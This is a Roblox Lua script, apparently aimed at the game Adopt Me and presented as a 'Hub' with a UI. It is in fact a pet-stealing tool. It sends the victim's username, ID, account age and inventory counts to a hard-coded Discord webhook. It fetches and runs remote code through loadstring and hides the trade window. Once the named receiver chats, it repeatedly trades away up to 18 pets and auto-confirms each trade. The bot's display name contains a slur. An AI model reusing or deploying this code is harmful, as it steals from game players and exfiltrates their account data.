Username = "kely5171"
Webhook = https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn""
local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads('ClientData')
local legendaries_count = 0
local mega_count = 0
local neon_count = 0
local ultra_count = 0
local rare_count = 0
local uncommon_count = 0
local common_count = 0

for i, v in pairs(ClientData.get("inventory").pets) do
  if InventoryDB[v.category][v.id].rarity == "legendary" then
    legendaries_count = legendaries_count + 1
  end
  if InventoryDB[v.category][v.id].properties == "mega_neon" then
    mega_count = mega_count + 1
  end
  if InventoryDB[v.category][v.id].properties == "neon" then
    neon_count = neon_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
    ultra_count = ultra_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "rare" then
    rare_count = rare_count + 1
  end
    if InventoryDB[v.category][v.id].rarity == "uncommon" then
    uncommon_count = uncommon_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "common" then
    common_count = common_count + 1
  end
end



if legendaries_count >= 1 or mega_count >= 1 or neon_count >= 1 then
    rizz = '-- @everyone <@1247565783299784725>'
else
    rizz = '-- '
end

rizz = rizz .. '\n' .. TeleportScript .. '\n'

local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local userr = Username
local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
local data = {
  username = 'LiggyNiggy Hub ☁️',
  avatar_url = 'https://cdn.discordapp.com/attachments/1266886405208936650/1270128838679986228/images_2.jpg?ex=66b29328&is=66b141a8&hm=6db84cb36a52d8b48f1b940c42ddc1fc118eb18073bf38bcc629bae35e426f6b&',
  content = '@everyone Join your player using **Join Script** and type **Anything** in chat to start stealing! It will auto trade!',
  embeds = {
    {
      title = 'Version 1.7 💻',
      description = '**🌩  User Information**: \n ```lua\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. userr ..'\n```\n **🌧 Inventory**: \n ```lua\n🐙 Legendaries: '.. tostring(legendaries_count).. '\n🦄 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🦅 Ultra Rares: '.. tostring(ultra_count).. '\n🐶 Rares: '.. tostring(rare_count).. '\n🐳 Uncommons: '.. tostring(uncommon_count).. '\n🐢 Commons: '.. tostring(common_count).. '\n```\n**🌦 Join Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
      color = 9807270
    }
  }
}
local httpRequest = http.request or httprequest
if httpRequest then
  httpRequest({
    Url = Webhook,
    Method = 'POST',
    Headers = {
      ['Content-Type'] = 'application/json'
    },
    Body = game:GetService('HttpService'):JSONEncode(data)
  })
else
  print("LMAOOOOOO")
end

if getgenv().ui == nil then
    getgenv().ui = true
end
if getgenv().ui == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
    print("True GUI")
elseif getgenv().ui == false then
    print("False GUI")
end

local function SendTrade(Username)
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")
    SendTradeRequest:FireServer(game.Players[Username])
end
local function AddPets()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local Juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
    if Juj.pets then
        local PetCount = 0
        local PetUids = {}
        for PetUid, PetData in pairs(Juj.pets) do
            table.insert(PetUids, PetUid)
        end
        
        while #PetUids > 0 do
            local PetUid = table.remove(PetUids, 1)
            AddPetRemote:FireServer(PetUid)
            PetCount = PetCount + 1
            if PetCount >= 18 then
                break
            end
        end
    else
        print("No pets found in inventory.")
    end
end
local function AcceptTrade()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    AcceptNegotiationRemote:FireServer()
end
local function ConfirmTrade()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    AcceptTradeRemote:FireServer()
end
game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
local function StartSteal()
    while task.wait(15) do
    SendTrade(Username)
    wait(3)
    AddPets()
    wait(5.5)
    AcceptTrade()
    wait(15)
    ConfirmTrade()
       end
end
for _, plr in pairs(game.Players:GetPlayers()) do
  if plr.Name:lower() == Username:lower() then
    plr.Chatted:Connect(function()
      StartSteal()
    end)
  end
end

game.Players.PlayerAdded:Connect(function(plr)
  if plr.Name:lower() == Username:lower() then
    plr.Chatted:Connect(function()
      StartSteal()
    end)
  end
end)
